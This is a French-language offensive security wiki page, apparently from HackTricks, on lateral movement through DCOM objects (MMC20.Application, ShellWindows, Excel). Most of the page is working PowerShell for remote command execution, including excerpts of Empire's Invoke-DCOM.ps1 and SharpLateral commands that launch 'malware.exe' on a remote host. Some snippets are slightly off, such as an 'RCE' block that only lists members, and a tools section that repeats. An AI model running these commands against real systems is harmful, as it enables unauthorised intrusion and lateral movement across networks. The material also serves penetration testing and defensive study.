# DCOM Exec

{{#include ../../banners/hacktricks-training.md}}

## MMC20.Application

**Pour plus d'informations sur cette technique, consultez le post original de [https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/](https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/)**

Les objets du Modèle d'Objet Composant Distribué (DCOM) présentent une capacité intéressante pour les interactions basées sur le réseau avec des objets. Microsoft fournit une documentation complète pour DCOM et le Modèle d'Objet Composant (COM), accessible [ici pour DCOM](https://msdn.microsoft.com/en-us/library/cc226801.aspx) et [ici pour COM](<https://msdn.microsoft.com/en-us/library/windows/desktop/ms694363(v=vs.85).aspx>). Une liste d'applications DCOM peut être récupérée en utilisant la commande PowerShell :
```bash
Get-CimInstance Win32_DCOMApplication
```
L'objet COM, [MMC Application Class (MMC20.Application)](https://technet.microsoft.com/en-us/library/cc181199.aspx), permet le scripting des opérations des modules complémentaires MMC. Notamment, cet objet contient une méthode `ExecuteShellCommand` sous `Document.ActiveView`. Plus d'informations sur cette méthode peuvent être trouvées [ici](<https://msdn.microsoft.com/en-us/library/aa815396(v=vs.85).aspx>). Vérifiez son fonctionnement :

Cette fonctionnalité facilite l'exécution de commandes sur un réseau via une application DCOM. Pour interagir avec DCOM à distance en tant qu'administrateur, PowerShell peut être utilisé comme suit :
```powershell
[activator]::CreateInstance([type]::GetTypeFromProgID("<DCOM_ProgID>", "<IP_Address>"))
```
Cette commande se connecte à l'application DCOM et renvoie une instance de l'objet COM. La méthode ExecuteShellCommand peut ensuite être invoquée pour exécuter un processus sur l'hôte distant. Le processus implique les étapes suivantes :

Vérifier les méthodes :
```powershell
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application", "10.10.10.10"))
$com.Document.ActiveView | Get-Member
```
Obtenir RCE :
```powershell
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application", "10.10.10.10"))
$com | Get-Member

# Then just run something like:

ls \\10.10.10.10\c$\Users
```
## ShellWindows & ShellBrowserWindow

**Pour plus d'informations sur cette technique, consultez le post original [https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/](https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/)**

L'objet **MMC20.Application** a été identifié comme manquant de "LaunchPermissions" explicites, par défaut aux permissions qui permettent l'accès aux Administrateurs. Pour plus de détails, un fil peut être exploré [ici](https://twitter.com/tiraniddo/status/817532039771525120), et l'utilisation de [@tiraniddo](https://twitter.com/tiraniddo)’s OleView .NET pour filtrer les objets sans permission de lancement explicite est recommandée.

Deux objets spécifiques, `ShellBrowserWindow` et `ShellWindows`, ont été mis en évidence en raison de leur manque de permissions de lancement explicites. L'absence d'une entrée de registre `LaunchPermission` sous `HKCR:\AppID\{guid}` signifie qu'il n'y a pas de permissions explicites.

### ShellWindows

Pour `ShellWindows`, qui manque d'un ProgID, les méthodes .NET `Type.GetTypeFromCLSID` et `Activator.CreateInstance` facilitent l'instanciation de l'objet en utilisant son AppID. Ce processus utilise OleView .NET pour récupérer le CLSID pour `ShellWindows`. Une fois instancié, l'interaction est possible via la méthode `WindowsShell.Item`, conduisant à des invocations de méthodes comme `Document.Application.ShellExecute`.

Des exemples de commandes PowerShell ont été fournis pour instancier l'objet et exécuter des commandes à distance :
```powershell
$com = [Type]::GetTypeFromCLSID("<clsid>", "<IP>")
$obj = [System.Activator]::CreateInstance($com)
$item = $obj.Item()
$item.Document.Application.ShellExecute("cmd.exe", "/c calc.exe", "c:\windows\system32", $null, 0)
```
### Mouvement latéral avec des objets DCOM Excel

Le mouvement latéral peut être réalisé en exploitant des objets DCOM Excel. Pour des informations détaillées, il est conseillé de lire la discussion sur l'utilisation d'Excel DDE pour le mouvement latéral via DCOM sur [le blog de Cybereason](https://www.cybereason.com/blog/leveraging-excel-dde-for-lateral-movement-via-dcom).

Le projet Empire fournit un script PowerShell, qui démontre l'utilisation d'Excel pour l'exécution de code à distance (RCE) en manipulant des objets DCOM. Ci-dessous se trouvent des extraits du script disponible sur [le dépôt GitHub d'Empire](https://github.com/EmpireProject/Empire/blob/master/data/module_source/lateral_movement/Invoke-DCOM.ps1), montrant différentes méthodes pour abuser d'Excel pour RCE :
```powershell
# Detection of Office version
elseif ($Method -Match "DetectOffice") {
$Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
$Obj = [System.Activator]::CreateInstance($Com)
$isx64 = [boolean]$obj.Application.ProductCode[21]
Write-Host  $(If ($isx64) {"Office x64 detected"} Else {"Office x86 detected"})
}
# Registration of an XLL
elseif ($Method -Match "RegisterXLL") {
$Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
$Obj = [System.Activator]::CreateInstance($Com)
$obj.Application.RegisterXLL("$DllPath")
}
# Execution of a command via Excel DDE
elseif ($Method -Match "ExcelDDE") {
$Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
$Obj = [System.Activator]::CreateInstance($Com)
$Obj.DisplayAlerts = $false
$Obj.DDEInitiate("cmd", "/c $Command")
}
```
### Outils d'automatisation pour le mouvement latéral

Deux outils sont mis en avant pour automatiser ces techniques :

- **Invoke-DCOM.ps1** : Un script PowerShell fourni par le projet Empire qui simplifie l'invocation de différentes méthodes pour exécuter du code sur des machines distantes. Ce script est accessible dans le dépôt GitHub d'Empire.

- **SharpLateral** : Un outil conçu pour exécuter du code à distance, qui peut être utilisé avec la commande :
```bash
SharpLateral.exe reddcom HOSTNAME C:\Users\Administrator\Desktop\malware.exe
```
## Outils Automatiques

- Le script Powershell [**Invoke-DCOM.ps1**](https://github.com/EmpireProject/Empire/blob/master/data/module_source/lateral_movement/Invoke-DCOM.ps1) permet d'invoquer facilement toutes les méthodes commentées pour exécuter du code sur d'autres machines.
- Vous pouvez également utiliser [**SharpLateral**](https://github.com/mertdas/SharpLateral):
```bash
SharpLateral.exe reddcom HOSTNAME C:\Users\Administrator\Desktop\malware.exe
```
## Références

- [https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/](https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/)
- [https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/](https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/)

{{#include ../../banners/hacktricks-training.md}}
